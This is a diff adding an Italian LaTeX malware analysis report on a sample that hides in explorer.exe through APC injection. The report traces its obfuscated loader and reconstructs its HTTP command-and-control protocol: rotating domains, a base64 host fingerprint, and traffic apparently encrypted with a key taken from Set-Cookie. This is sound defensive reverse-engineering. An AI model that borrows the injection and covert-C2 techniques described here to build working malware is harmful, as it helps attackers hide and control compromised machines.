+                \item Fa ripartire il main thread di explorer.exe
+                \item Attende creazione della pipe da parte di explorer.exe, (possibile solo dopo l'esecuzione
+                    della APC)
+                \item Una volta creata da explorer.exe "fake", scrive sulla pipe l'absolute path del
+                    percorso di sample.exe associata al processo corrente (ottenuta con \texttt{GetModuleFileNameA})
+                \item Termina processo corrente (\texttt{ExitProcess(0)}), quindi il malware iniettato rimane in esecuzione nascosto 
+                    nel "guscio" di explorer.exe
+            \end{enumerate}
+
+            \section{Analisi del child process "Explorer.exe"}
+
+            La prima cosa che ci interessa è tentare un'analisi statica avanzata: grazie a OllyDbg siamo
+            in grado di prelevare lo shellcode (funzione APC) iniettato nel processo legittimo, effettuarne il
+            dump e quindi analizzarlo con Ghidra. Lo shellcode viene prelevato ancora dal processo associato all'immagine di sample.exe (\texttt{WriteProcessMemory} sta per scrivere lo shellcode/APC nell'address space del
+            processo remoto associato a explorer.exe - copiamo il buffer sorgente)
+
+            \pic{brkp_wpm}{Breakpoint su \texttt{WriteProcessMemory}}{19cm}{4cm}
+            \pic{brkp_wpm_args}{Parametro \texttt{Buffer} di interesse, follow dump}{13cm}{3cm}
+            \pic{brkp_wpm_dumpmem}{Dump dall'indirizzo puntato da \texttt{Buffer}, len = \texttt{BytesToWrite}}
+            {14cm}{8cm}
+            \pic{apccode_ghidra_import}{\texttt{x86:LittleEndian:default:Windows}}{10cm}{5cm}
+
+            Ma una volta disassemblato, l'amara sorpresa: è presente lo stesso metodo di obfuscation di prima -
+            è praticamente impossibile eseguire RCE con solo il disassembler interattivo.
+            \pic{ghidra_imposs_explorer}{Porzione di codice presente nel dump}{9cm}{7cm}
+
+            \textbf{Usiamo un debugger}: dal breakpoint su sample.exe (breakpoint su \texttt{WriteProcessMemory}) 
+            apriamo un'altra istanza di OllyDbg - il processo child creato (sospeso) dovrebbe essere attachable
+            dal debugger. L'idea è quella di agganciare \underline{prima} il processo sospeso con OllyDbg e \underline{poi} far ripartire sample.exe
+            in modo che raggiunga \texttt{ResumeThread}. Tuttavia non è possibile - il processo sospeso non appare
+            nel menu di attach di OllyDbg, nemmeno con utente amministratore.
+
+            \subsection{Attach al processo "Explorer.exe" post-\texttt{ResumeThread}}
+            E' comunque possibile effettuare attach/tracing del processo da parte del debugger non appena il thread
+            viene avviato.
+
+            Prima di agganciare il debugger al processo, vediamo qual'è la pagina di memoria con permessi execute,
+            e dove verrà caricato il codice dell'APC:
+            \pic{sample_vex}{\texttt{EAX = 00A10000}}{18cm}{3cm}
+            \pic{sample_wpm}{\texttt{WriteProcessMemory}}{18cm}{3cm}
+            \pic{sample_qua}{\texttt{QueueUserAPC}}{18cm}{3cm}
+
+            Quindi, il codice offuscato, difficile da analizzare sta nel processo remoto (con immagine explorer.exe), appena creato, in
+            \texttt{00A10000}
+
+            \pic{explorer_threads}{Stato dei thread e call stack main thread}{15cm}{10cm}
+            \pic{explorer_pages}{Pagine di principale interesse del processo}{10cm}{5cm}
+            
+            L'instruction pointer per il main thread, al momento della pausa del processo dal debugger
+            si trovava in \texttt{ntdll::ZwWaitForSingleObject}, ma dalla call stack, la chiamata di più alto
+            livello, \texttt{KERNEL32::WaitForSingleObject} viene effettuata dal processo all'indirizzo
+            \texttt{00D0D050}. Nella figura \ref{fig:explorer_threads} è selezionato il main thread nella finestra
+            dei threads, e l'ultima called from prima di passare alle pagine di \texttt{kernel32}, 
+            \texttt{kernelbase}, \texttt{ntdll}. La figura \ref{fig:explorer_pages} sono indicate le pagine
+            di principale interesse per il processo.
+
+            Avendo selezionato appunto la voce "called from" evidenziata in figura \ref{fig:explorer_threads},
+            il listing parte proprio dalla \texttt{CALL DWORD PTR DS:[D25060]}. In \texttt{DS:[D25060]} si trova
+            proprio l'indirizzo di \texttt{KERNEL32::WaitForSingleObject} chiamato dal codice di explorer "fake".
+
+            Osserviamo però come il codice del main thread (quello che era stato vittima dell'APC injection) sia
+            comunque diverso da quello estratto dal memory dump del codice dell'APC da sample.exe (in questo
+            caso infatti, il codice risulta molto più leggibile):
+            \pic{explorer_listing}{CPU+Listing view}{15cm}{10cm}
+
+            Però, facendo riferimento alla figura \ref{fig:explorer_pages}, osserviamo che c'è ancora mappata in
+            memoria la "serie di pagine" \texttt{00A10000} allocate da sample.exe per effettuare APC injection e 
+            cliccandoci due volte, appare il memory dump della
+            pagina, che OllyDbg è in grado di interpretare come istruzioni. Ritroviamo il codice offuscato. Però
+            al momento dell'aggancio da parte del debugger al processo, il codice visto era diverso, ovvero, quello a cui
+            siamo risaliti dal call stack. L'instruction pointer del main thread deve essere stato cambiato da \texttt{00A1XXXX} a
+            \texttt{00D0XXXX} a un certo punto dell'esecuzione.
+            \pic{explorer_shellcode_listing}{Codice offuscato}{11cm}{10cm}
+
+            \subsubsection{Cosa fa il codice offuscato iniettato nelle pagine di memoria \texttt{00A1XXXX}?}
+            
+            \textit{Spiegazione a pagina \pageref{page:malware_deployer_explaination}}
+
+            \pic{explorer_comparison_exec_inj}{}{19cm}{21cm}
+            \pic{explorer_comparison_exec_orig}{}{19cm}{21cm}
+
+            \pic{explorer_comparison_mem0_inj}{}{19cm}{23cm}
+            \pic{explorer_comparison_mem0_orig}{}{19cm}{23cm}
+
+            \pic{explorer_comparison_mem1_inj}{}{19cm}{23cm}
+            \pic{explorer_comparison_mem1_orig}{}{19cm}{23cm}
+            
+            \pagebreak
+
+            \label{page:malware_deployer_explaination}
+            
+            Tenuto conto\dots 
+            \begin{itemize}
+                \item delle immagini \ref{fig:explorer_comparison_exec_inj} e
+                    \ref{fig:explorer_comparison_exec_orig}, dove la prima rappresenta i moduli Windows (DLLs) 
+                    caricati nell'address space del processo vittima e la seconda, la stessa cosa per il processo 
+                    explorer.exe "vero e proprio"
+                \item delle immagini \ref{fig:explorer_comparison_mem0_inj} e 
+                    \ref{fig:explorer_comparison_mem0_orig}, dove la prima rappresenta gli indirizzi più bassi
+                    delle pagine mappate nell'address space del processo vittima e la seconda, la stessa cosa per il
+                    processo explorer.exe "vero e proprio"
+                \item delle immagini \ref{fig:explorer_comparison_mem1_inj} e
+                    \ref{fig:explorer_comparison_mem1_orig}, dove la prima rappresenta gli indirizzi più alti
+                    delle pagine mappate nell'address space del processo vittma e la seconda, la stessa cosa per il
+                    processo explorer.exe "vero e proprio"
+                \item del fatto che gli snapshot del processo "explorer.exe" originale sono stati presi quando ha terminato la
+                    sua esecuzione e nel frattempo sono stati caricati altri moduli
+                \item del fatto che gli snapshot del processo "explorer.exe" vittima sono stati presi quando l'APC è stata          eseguita e quindi il flusso di istruzioni regolare "dirottato"
+                \item del fatto che sia presente un nuovo mapping (\texttt{00D0XXXX}) nel quale c'è codice eseguibile leggibile:
+                    pagine di memoria e codice del quale non ne eravamo a conoscenza: è stato effettuato questo nuovo mapping e caricato questo nuovo codice eseguibile tra la
+                    \texttt{ResumeThread} e l'attach del processo vittima al debugger (quindi in quel lasso di tempo il processo non era tracciato)
+                \item del fatto che il main thread di cui supponevamo l'instruction pointer nelle pagine
+                    \texttt{00A1XXXX}, ha invece \texttt{EIP = 00D0XXXX} che punta a istruzioni non più offuscate
+                    ma leggibili
+            \end{itemize}
+
+            \dots possiamo supporre che il codice offuscato iniettato con l'APC injection (nonostante non si riesca a 
+            comprendere), dopo essere stato eseguito, a causa del processo originale che ha come immagine explorer.exe - che esegue una 
+            \texttt{WaitForSingleObjectEx}, \texttt{SleepEx}, \dots, svolga i seguenti compiti:
+
+            \begin{enumerate}
+                \item \textbf{Presumibilmente, deve sapere in quale punto dell'address space è stato caricato}
+                \item \textbf{Non effettua nessun unmapping di pagine già esistenti create dal SO nel processo stesso} -
+                    i moduli e le pagine dei due processi (si vedano le immagini sopra, che confrontano processo explorer.exe fake vs originale), quando messi a confronto sono simili. Va tenuto conto
+                    del fatto che il processo explorer.exe vero e proprio, quando lasciato eseguire carica altri
+                    moduli dinamicamente e che l'APC, quando eseguita abbia un ambiente di esecuzione del processo ancora
+                    "primordiale" del processo explorer.exe - da li in poi l'APC non ritornerà più il controllo
+                    al vero e proprio explorer.exe (lo stato delle DLL caricate/pagine mappate rimarrà pressochè invariato data la natura minimalista e "mimetica" del malware)
+                \item \textbf{Effettua nuova allocazione di pagine per il codice del malware vero e proprio (quello che è il codice leggibile) da nascondere
+                    nel processo explorer.exe}
+                \item \textbf{Carica il codice del malware nelle pagine} - non sappiamo in che modo lo faccia -
+                    ovvero se lo preleva dall'eseguibile sample.exe o è integrato nell'APC code.
+                \item \textbf{Se necessario, effettua routine di decoding/decompressione/decifratura sul codice del malware appena caricato}
+                \item \textbf{Effettua risoluzione/binding delle call delle DLL necessarie} - se necessario può caricare
+                    nuove DLL con \texttt{LoadLibraryA} e ripetere quest'ultimo punto
+                \item \textbf{Passa il controllo al codice del malware completamente caricato}
+            \end{enumerate}
+
+            \underline{\textbf{Questo codice offuscato è quindi un ultimo stage del loader del malware}}
+
+            \pagebreak
+
+            \subsection{Analisi dinamica del malware}
+
+            Prima di addentrarci nell'analisi dinamica avanzata conviene capire che cosa tenta di fare
+            il malware in black box:
+
+            \pic{procmon_explorer_cmdline}{Apply del filtro in procmon}{15cm}{5cm}
+
+            \underline{Il malware tenta la connessione TCP a un qualche server}
+            \pic{procmon_explorer_interesting}{Tentativo di apertura connessione TCP}{18cm}{2cm}
+
+            Il resto del log è di poco conto: numerose letture di chiavi di registro che riguardano
+            configurazione di WinSock2, TCP/IP, DNS, \dots e altri eventi relativi al caricamento delle DLL
+            \pic{procmon_explorer_notinteresting}{Fetch configurazione WinSock2, TCP/IP, DNS, \dots}{18cm}{7cm}
+
+            Da notare che il tentativo di connessione fallisce e il SO inizia a liberare le risorse allocate
+            per la connessione TCP (evento log \textit{TCP Disconnect}).
+
+            \pagebreak
+            
+            \subsubsection{Cambio reply A record DNS verso \texttt{localhost} e dominio di interesse del malware}
+
+            Voglio effettuare setup server TCP alla quale far connettere il malware - ApateDNS permette di
+            cambiare l'esito del DNS record - restituendo localhost come A record per ogni richiesta di risoluzione DNS.
+
+            Come evidente dalla figura \ref{fig:dnslookup}, sono presenti molteplici servizi di sistema che
+            effettuano lookup DNS e risulta difficile capire quale sia la richiesta di risoluzione nameserver da 
+            parte del malware.
+
+            \pic{dnslookup}{ApateDNS}{16cm}{10cm}
+
+            Però, dato che comunque il malware deve usare una funzione di libreria per effettuare risoluzione
+            del nome, tipo 
+            \href{https://learn.microsoft.com/it-it/windows/win32/api/winsock/nf-winsock-gethostbyname}{\texttt{gethostbyname}}, che prende in input una stringa (dominio), allora la stringa deve essere
+            da qualche parte nel codice eseguibile - provo a cercare un dominio che "non passa inosservato" che è
+            \texttt{toysbagonline.com} (in figura \ref{fig:dnslookup}).
+
+            Eseguo l'attach al processo già in esecuzione con OllyDbg e nella lista dei thread,
+            salta all'occhio quello con \texttt{Ident = 000001D4} che ha tentato di connettersi al server (non riuscendoci, \texttt{Last Error = WSAECONNREFUSED})
+
+            \pic{wsaeconnrefused}{Variabile \texttt{Last-Error} del thread settata su \texttt{WSAECONNREFUSED}}{18cm}{4cm}
+
+            Quindi risalgo alla call stack e osservo da
+            dove viene chiamato \texttt{Kernel32::Sleep}, quindi seleziono l'indirizzo su "called from" \dots
+
+            \pic{wsaeconnrefused_sleep}{Sleep ora "in corso" per il thread selezionato}{17cm}{5cm}
+
+            \dots ed effettuo il dump per tutto il listing, quindi posso cercare la stringa del dominio:
+
+            \pic{wsaeconnrefused_dump}{Cerco la stringa \texttt{toysbagonline.com} nel dump del listing}
+            {18cm}{12cm}
+
+            \textbf{Il malware tenta la risoluzione DNS per il dominio \texttt{toysbagonline.com}}
+
+            \subsubsection{Variabile \texttt{Last-Error = WSAECONNREFUESED}}
+
+            Si fa caso al fatto che comunque l'errore della variabile globale \texttt{Last-Error} (tipo 
+            \texttt{errno} per i sistemi Unix-like), fa riferimento alla connessione al server \underline{dopo} 
+            la risoluzione
+            DNS (si veda \href{https://learn.microsoft.com/it-it/windows/win32/api/winsock2/nf-winsock2-connect}
+            {\texttt{WinSock2::connect}})! Questo significa che un server DNS da esito positivo alla ricerca -
+            esiste un A record per il dominio, ma l'host che si tenta di raggiungere non ha alcun servizio
+            in esecuzione sulla porta destinazione aperta.
+            
+            Ovviamente, quando ApateDNS è in esecuzione allora \texttt{gethostbyname("toysbagonline.com") = 
+            127.0.0.1}, e poi connection refused finchè non viene avviato un server TCP locale alla porta destinazione
+            che il malware contatta.
+            
+            \subsubsection{Informazioni sul DNS record e host originali}
+            
+            Dopo aver spento il server avviato da ApateDNS (niente più risposte \texttt{A record 127.0.0.1} per ogni richiesta risoluzione DNS), effettuo risoluzione DNS manuale con nslookup e provo
+            un ping ICMP:
+
+            \pic{dnsresolveok}{Output \texttt{nslookup} positivo}{13cm}{5cm}
+            \pic{icmpfail}{Output \texttt{ping} negativo}{13cm}{5cm}
+
+            Deduciamo che molto probabilmente il server da contattare è down (o almeno, c'è un firewall che rifiuta pacchetti in entrata ICMP) ma esiste ancora un DNS record per esso.
+            
+            \pagebreak
+
+            \subsubsection{Determinare la porta monitorando con Wireshark}
+
+            Per aprire un server effimero con netcat, dobbiamo capire quale sia la porta alla quale il malware
+            tenta di connettersi (è inclusa nell'header TCP).
+
+            Il malware, tramite chiamata \texttt{WinSock2::connect}, genera il seguente pacchetto TCP:
+
+            \pic{dstport}{Pacchetto \texttt{SYN} di inizio 3-way handshake. Porta destinazione \texttt{80}.}{17cm}{4cm}
+
+            \subsubsection{Scorrere il dump effettuato in figura \ref{fig:wsaeconnrefused_dump}}\label{sect:dump_analyze}
+            
+            Prima di continuare, tanto vale scorrere il dump del listing delle istruzioni asm per vedere se c'è
+            qualcosa di importante: in particolare, OllyDbg mostra informazioni aggiuntive a destra.
+
+            \begin{itemize}
+                \item Sono presenti varie \texttt{LoadLibraryA} e \texttt{GetProcAddress}
+                \item Stringhe ASCII tipo "invalid string position", "string too long"
+                \item Un path al temp file C:\textbackslash Users\textbackslash ste\textbackslash AppData\textbackslash Local\textbackslash Temp\textbackslash \textbackslash5962052
+                \item Utilizzo di \texttt{CreatePipe}
+                \item \textbf{$\rightarrow$ Una stringa unicode "cmd.exe /u /c \%s" $\leftarrow$} 
+                \item Utilizzo di \texttt{CreateProcessW}, \texttt{CloseHandle} e \texttt{ReadFile}
+                \item Utilizzo di \texttt{WideCharToMultiByte}, \texttt{MoveFileA}, \texttt{TerminateProcess}
+                \item Utilizzo di \texttt{TerminateThread}, \texttt{ExitProcess} e \texttt{DeleteFileA}
+                \item Stringa ASCII "Unknown exception"
+                \item Utilizzo di \texttt{InternetCrackUrlA}
+                \item Utilizzo di \texttt{WSAStartup}, \texttt{getaddrinfo}, \texttt{inet\_addr}, \dots (varie
+                funzioni per i socket, conversione host-network byte order, \dots)
+                \item Utilizzo di \texttt{CreateFileA}, \texttt{WriteFile}
+                \item \dots
+                \item Stringa ASCII \texttt{C:\textbackslash Users\textbackslash ste\textbackslash 
+                Desktop\textbackslash sample.exe} che è stata passata dal processo sample.exe (dal "codice 
+                malevolo") a Explorer.exe tramite la named pipe 
+                \texttt{\textbackslash\textbackslash.\textbackslash pipe\textbackslash pipeege}. Si veda la sezione \ref{sect:malcodeapimon}.
+            \end{itemize}
+
+            Ovviamente, la prima cosa che salta all'occhio è la presenza di cmd.exe, in particolare con il \%s che
+            permette la formattazione con qualsiasi stringa.
+            \underline{Conviene settare un breakpoint} all'indirizzo \texttt{XXXX3CCA} dove viene pushata questa stringa.
+
+            Se non altro, il dubbio viene incrementato dal fatto che poco dopo c'è proprio la \texttt{CreateProcessW} (non ci sono salti, il flusso va diretto verso la create process).
+
+            \pic{wellwellwell}{cmd.exe con il \%s e dopo la \texttt{CreateProcessW} è "importante"}{12cm}{6cm}
+            
+            \subsubsection{Riavvio di ApateDNS e avvio del server TCP effimero con netcat}
+
+            \pic{httpget}{Richiesta HTTP GET del malware al server}{19cm}{4cm}
+
+            \textbf{Il malware tenta di nascondersi nel traffico HTTP}. La richiesta in figura \ref{fig:httpget}
+            sembra una normalissima richiesta HTTP GET, in realtà sta comunicando con un server dalla quale
+            probabilmente, in qualche modo riceve comandi. Ancora non sappiamo come decodificare il contenuto.
+
+            Quello che si osserva comunque anche con l'ausilio di OllyDbg, è che se:
+            \begin{itemize}
+                \item Il server è offline (connection refused)
+                \item La risposta è malformata (rispetto a std. HTTP)
+            \end{itemize}
+
+            Il server smette di rispondere, per 10 minuti, poi riinvia lo stesso messaggio.
+            Utilizzando OllyDbg:
+
+            \pic{noans_thrs}{Threads - \texttt{Ident = \{9A8, 1B28\}} di interesse}{19cm}{5cm}
+
+            \pic{noans_mainthr_callstack}{Call stack main thread}{16cm}{6cm}
+
+            \pic{noans_callstack}{Call stack thread che ha effettuato la richiesta GET}{16cm}{6cm}
+
+            Il main thread è bloccato nel join del thread secondario.
+
+            Il thread che ha effettuato la prima richiesta GET (secondario) rimane "in vita", aspetta 10 minuti (vedi arg.
+            fig. \ref{fig:noans_callstack}) e poi rieffettua la richiesta GET (la stessa in figura \ref{fig:httpget}), aprendo una \underline{nuova connessione
+            TCP}. La connessione TCP corrente non viene chiusa mai dal malware. Il server deve chiuderla.
+
+            Ripete finchè non riceve una risposta HTTP positiva, che supponiamo sia qualcosa del tipo:
+
+            \begin{lstlisting}
+HTTP/1.1 200 OK\r\n
+Host: toysbagonline.com\r\n
+Connection: keep-alive\r\n
+\r\n
+            \end{lstlisting}
+
+            \pic{pyhttpans}{Invio risposta HTTP corretta da una python shell}{19cm}{10cm}
+
+            Dalla figura \ref{fig:pyhttpans} si osserva come dopo l'invio (\texttt{conn[0].send(\dots)}) della
+            risposta, la \texttt{recv} successiva sia bloccata.
+
+            Aprire un altro socket / netcat è inutile - zero richieste in arrivo dal malware (anche nei 10 min).
+
+            Su OllyDbg, la situazione cambia radicalmente:
+
+            \pic{pyhttpans_mainthr_callstack}{Main thread in sleep}{17cm}{7cm}
+
+            Dopo l'invio della risposta HTTP corretta:
+            \begin{itemize}
+                \item Il numero di thread del processo è molto più bassa
+                \item L'unico thread rilevante è il main thread, che è in sleep (30 min) e non in join di un
+                    altro thread
+                \item Il thread che ha ricevuto risposta codificata correttamente (risp. HTTP) è terminato.
+            \end{itemize}
+
+            Ai fini dell'analisi dinamica, lasciamo che passino 30 minuti in modo che il main thread si sblocchi
+            per vedere cosa succede.
+
+            Al termine dei 30 min (poco prima), \underline{riaprendo un server} (nuova connessione TCP) con netcat vediamo la stessa richiesta GET della figura
+            \ref{fig:httpget} tranne sul path argomento del metodo HTTP GET.
+
+            \pic{httpget_after}{Differenze rispetto alla figura \ref{fig:httpget}}{19cm}{5.5cm}
+
+            Data la richiesta GET simile, supponiamo che lo stato riparta da quanto scritto sopra, a partire
+            dalla figura \ref{fig:httpget} (nel senso che a partire dallo stato che assume il malware 
+            dalla figura \ref{fig:httpget_after}, se si invia risposta HTTP corretta allora dovremo attendere ancora una volta 30 min, altrimenti 10 min - ovvero lo stesso identico comportamento scritto sopra per la figura \ref{fig:httpget}).
+            
+            \textbf{Descrivere interamente il protocollo di comunicazione adottato dal malware è abbastanza complicato a causa dell'intervallo di 10 min / 30 min. Inviare dati, attendere tanti minuti e ricevere risposta
+            è impraticabile.}
+            
+            Questo ci da un'idea di come avvenga la comunicazione a grandi linee, la conoscenza del protocollo
+            andrà raffinata proseguendo con l'ausilio dell'analisi dinamica avanzata.
+
+            \subsubsection{Analisi dinamica avanzata}
+
+            La prima cosa da fare è disfarsi del fastidioso \texttt{Sleep} tramite patching in memoria:
+            dalla figura \ref{fig:pyhttpans_mainthr_callstack}, chiamata alla procedura \texttt{KERNEL32.Sleep},
+            alla colonna \texttt{Called from} c'è l'indirizzo nella quale c'è la \texttt{call} alla \texttt{Sleep}.
+            Facendo doppio click, arriviamo a un wrapper della funzione (lo stesso sia per i 10 che i 30 minuti di attesa), che viene patchata interamente da NOPs.
+
+            L'indirizzo \texttt{Called from} indicato figura è \texttt{04FAB36E}, relativamente al codice è 
+            \texttt{XXXXB36E} (\texttt{VirtualAlloc} random base address).
+
+            Per evitare la prima sleep, la patch in-memory va effettuata \underline{dopo} che il malware si è 
+            connesso al server e invia richiesta HTTP, e \underline{prima} che il server risponda - per ricreare la situazione basta aprire un server effimero con netcat, attendere connessione e l'invio della richiesta HTTP GET da parte del malware al server netcat, mantenere il programma netcat attivo senza inviare risposta. Si passa quindi a OllyDbg, il malware debuggato si mette in pausa e quindi in call stack del thread che effettua la richiesta non c'è la \texttt{Sleep} (non c'è modo di far uscire il thread dallo stato di sleep, una volta che ci entra) ma la \texttt{recv} (in attesa di dati - sync/blocking - dal server di controllo) - questo permette all'analista di entrare nel listing assembly di OllyDbg e (in tutta tranquillità) patchare in memoria il wrapper
+            della \texttt{Sleep} con NOPs (lasciando la \texttt{RETN}). In questo modo, ogni volta che viene 
+            chiamato il wrapper della sleep, si ha uno sled di nop fino alla retn e sostanzialmente non si deve attendere più nulla (non ci sono più i 10 min/30 min d'attesa tra una risposta e l'altra ma solo qualche secondo), rendendo l'analisi dinamica molto più efficiente e scorrevole.
+
+            \pic{sleep}{Wrapper per la \texttt{Sleep}}{15cm}{5cm}
+            \pic{sleep_patched}{Patch dall'indirizzo \texttt{XXXXB360} \dots \texttt{XXXXB374}}{10cm}{9cm}
+
+            La prima cosa che si nota in ApateDNS, è che dopo aver patchato la \texttt{Sleep} e non avendo alcun
+            server aperto (programma netcat terminato o invio risposta HTTP malformata, quindi si ha un nuovo tentativo di connessione immediato - conn. refused), il malware effettua di continuo (grazie al patch del wrapper della sleep) tentativi di connessione a domini diversi (a rotazione):
+
+            \pic{moredomains}{6 domini totali contattati dal malware}{6cm}{7cm}
+
+            Aprendo un server effimero con netcat, la richiesta GET del malware è identica ma cambia l'header Host.
+
+            Inviando dati a caso con netcat e/o chiudendo la connessione con CTRL+C, il discorso non cambia.
+
+            Provando a inviare una risposta HTTP corretta (\texttt{HTTP/1.1 200 OK\textbackslash r\textbackslash 
+            n \dots}), il malware tenterà di ricontattare questo dominio che l'ultima volta gli ha risposto 
+            correttamente (possiamo identificarlo come server/dominio "healthy").
+
+            Se l'ultimo server healthy che gli ha risposto correttamente tutto un tratto \underline{smette} di rispondere
+            correttamente o va down (conn. refused), sembra che il malware smetta di inviare richieste del tutto.
+            
+            \pic{domainok}{\texttt{salmonrabbit.com} individuato come dominio healthy}{5cm}{4cm}
+
+            \textbf{Il malware fa affidamento a un meccanismo di fault tolerance rispetto ai server: 
+            inizialmente, a rotazione individua il primo server che gli risponde correttamente e lo sceglie per
+            la comunicazione. La scelta avviene secondo questo "pseudocodice":}
+
+            \textsc{Loop: contatta i seguenti domini (nell'ordine fornito), uno a uno finchè non trovi quello che risponde correttamente}
+            
+            \begin{enumerate}
+                \item \texttt{toysbagsonline.com}
+                \item \texttt{purewatertokyo.com}
+                \item \texttt{pinkgoat.com}
+                \item \texttt{yellowlion.com}
+                \item \texttt{salmonrabbit.com}
+                \item \texttt{bluecow.com}
+            \end{enumerate}
+            
+            \textsc{Se non è stato trovato alcun dominio che soddisfa il criterio, RIPROVA.}
+            
+            \textsc{Altrimenti, da ora in poi, utilizzalo per comunicare.}
+            
+            \textbf{Se il server scelto smette di rispondere correttamente o va down il malware interrompe la 
+            comunicazione DEL TUTTO (non contatta più altri server. Dipende dallo stato attuale del malware)}
+
+            \underline{\textbf{Tentativo di far generare una richiesta diversa dal malware}}
+
+            Provando a includere un corpo nella risposta HTTP del server di controllo, non porta a niente: sempre la stessa identica
+            risposta da parte del malware.
+
+            \begin{lstlisting}
+HTTP/1.1 200 OK \r\n
+Content-Length: 4\r\n
+Connection: keep-alive\r\n
+\r\n
+rand
+            \end{lstlisting}
+
+            Analizzando ad esempio la figura \ref{fig:httpget_after}, che è la richiesta GET di default,
+            non risulta nulla di importante. In ogni richiesta cambiano i due elementi cerchiati del path
+            di cui effettuare la GET dal server. Rimane sempre presente la sottostringa \texttt{ufw=MTAuMC4\dots}.
+
+            Insomma, non riusciamo a determinare molto e non si riesce a triggerare una risposta dal malware da
+            un certo messaggio dal server.
+
+            L'unica cosa da fare per avere una speranza di capirci qualcosa in più è usare il debugger e fare
+            step over sulle istruzioni.
+
+            \pagebreak
+
+            \subsubsection{Breakpoint dopo \texttt{WinSock2::recv} e serie di step over/step into}
+
+            In questa fase, in sostanza, dopo la recv, tentiamo di capire come viene effettuato il parsing della
+            richiesta HTTP. L'unico modo per farlo è tentare di scoprire qualcosa effettuando step over/step into.
+
+            \pic{brkp_after_recv}{La stringa cerchiata appare anche alla fine del path della GET}{15cm}{8cm}
+
+            \pic{brkp_after_recv_ans}{Risposta a caso inviata dal prompt di netcat (dopo rx HTTP GET del malware)}{10cm}{5cm}
+
+            \pic{brkp_after_recv_ans_part}{Ultima porzione della risposta puntata (primi 9 byte ignorati, errore di parsing?)}{14cm}{2.5cm}
+
+            \pagebreak
+            
+            Il malware fa confronti (molto probabilmente) per cercare il codice di successo \texttt{200} di HTTP
+
+            \pic{parse_200_hard}{il "200" appare più volte anche in confronti con stringhe}{14cm}{4cm}
+
+            Dato che non appare il "200" inizia immediatamente a ricostruire l'URL della GET da effettuare:
+
+            \pic{build_req_path}{}{15cm}{3cm}
+
+            \underline{Provando con una richiesta HTTP corretta}:
+
+            \begin{lstlisting}
+HTTP/1.1 200 OK \r\n
+Content-Length: 4\r\n
+Connection: keep-alive\r\n
+\r\n
+rand
+            \end{lstlisting}
+
+            \pic{parse_ok}{Ignora la stringa HTTP/1.1 (primi 9 byte)}{13cm}{2cm}
+
+            \pic{parse_contentlength}{Cerca l'header \texttt{Content-Length}}{13cm}{2cm}
+
+            \pic{parse_setcookie}{Cerca l'header \texttt{Set-Cookie}}{19cm}{6cm}
+
+            \pic{parse_body}{Ottiene il body}{12cm}{2cm}
+
+            Quattro domande, a questo punto:
+            \begin{itemize}
+                \item Perchè nel parsing della risposta cerca \texttt{Set-Cookie} (non presente in questa risposta HTTP del server di controllo)?
+                \item Che cos'è la stringa \texttt{ufw=MTAuMC4yLjE1fDEwLjB8MTJk}, il cui indirizzo è sempre
+                    in almeno un registro della CPU in qualunque punto dell'esecuzione?
+                \item Che cos'è la stringa \texttt{5ssjbyaprz2myim2} cerchiata in figura \ref{fig:httpget_after}
+                \item Che cos'è la stringa \texttt{1709931747} cerchiata in figura \ref{fig:httpget_after}
+            \end{itemize}
+
+            Si può rispondere subito alla seconda, infatti tentando di usare un decoder base64:
+
+            \begin{lstlisting}
+>>> import base64
+>>> x = base64.b64decode("MTAuMC4yLjE1fDEwLjB8MTJk")
+>>> print(x.decode('ascii'))
+10.0.2.15|10.0|12d
+            \end{lstlisting}
+            
+            Non si sa cosa siano le 3 informazioni contenute, separate da un pipe symbol.
+
+            Anche per la terza domanda, un decoder base64 decodifica ma i byte risultanti sono non-printabili:
+
+            \begin{lstlisting}
+>>> import base64
+>>> x = base64.b64decode("5ssjbyaprz2myim2")
+>>> print(x.decode('ascii'))
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+UnicodeDecodeError: 'ascii' codec can't decode byte 0xe6 in position 0: ordinal not in range(128)
+>>> print(x)
+b'\xe6\xcb#o&\xa9\xaf=\xa6\xca)\xb6'
+            \end{lstlisting}
+
+            Per la quarta domanda, non è proprio base64.
+            \begin{lstlisting}
+>>> import base64
+>>> x = base64.b64decode("1709931747")
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "C:\Python312\Lib\base64.py", line 88, in b64decode
+    return binascii.a2b_base64(s, strict_mode=validate)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+binascii.Error: Incorrect padding
+            \end{lstlisting}
+            
+            Per \underline{rispondere alla prima} bisogna aggiungere alla richiesta HTTP precedente, l'header 
+            \texttt{Set-Cookie} con qualche valore a caso.
+
+            \textbf{Inserendo \texttt{Set-Cookie} nell'header HTTP di risposta}
+
+            Alla risposta HTTP del server di controllo alla richiesta GET precedente da parte del malware viene aggiunto l'header \texttt{Set-Cookie}\dots
+
+            \begin{lstlisting}
+HTTP/1.1 200 OK \r\n
+Content-Length: 4\r\n
+Connection: keep-alive\r\n
+Set-Cookie: data\r\n       %%%%%%%% <--- aggiunta
+\r\n
+rand
+            \end{lstlisting}
+
+            \dots e la successiva richiesta del malware diventa una POST:
+
+            \pic{httppost}{HTTP POST con corpo}{19cm}{5cm}
+
+            Provando a riinviare un'altra risposta identica (stesso \texttt{Set-Cookie}), il malware risponde 
+            sempre con lo stesso corpo della richiesta \texttt{fipng=+LUZNz\dots}, cambia solo qualche carattere
+            verso la fine (ma è difficile notarlo a primo impatto). Anche cambiando il corpo della risposta HTTP da parte del server di controllo (\texttt{rand}), la successiva richiesta
+            del malware contiene la stessa stringa nel corpo.
+
+            Cambiando il valore dell'header entry \texttt{Set-Cookie} tutto il contenuto cambia totalmente.
+
+            Comunque, per capire di cosa si tratti, conviene sempre partire da base64:
+
+            \pic{decode}{Decoding base64}{17cm}{5cm}
+
+            Dalla figura \ref{fig:decode} deduciamo che i dati codificati in base64 erano caratteri non stampabili.
+
+            Dato che la stringa codificata base64 varia al variare di \texttt{Set-Cookie} e quindi variano anche
+            i bytes codificati da essa, deduciamo che \textbf{il malware nasconde il contenuto delle richieste/risposte
+            con un algoritmo di crittografia simmetrico. La chiave è il valore di \texttt{Set-Cookie}.}
+
+            Il problema in questi casi è che non si conosce l'algoritmo di crittografia utilizzato.
+
+            \begin{enumerate}
+                \item Si prova a decifrare il testo a tentativi
+                    \begin{itemize}
+                        \item Si potrebbe pensare ad AES, ma apparte per la configurazione AES-ECB, fa utilizzo di 
+                            init
+                            vector e quindi più cifrature consecutive dello stesso dato sarebbero dovute essere completamente diverse. Comunque, non sembra essere AES-ECB.
+
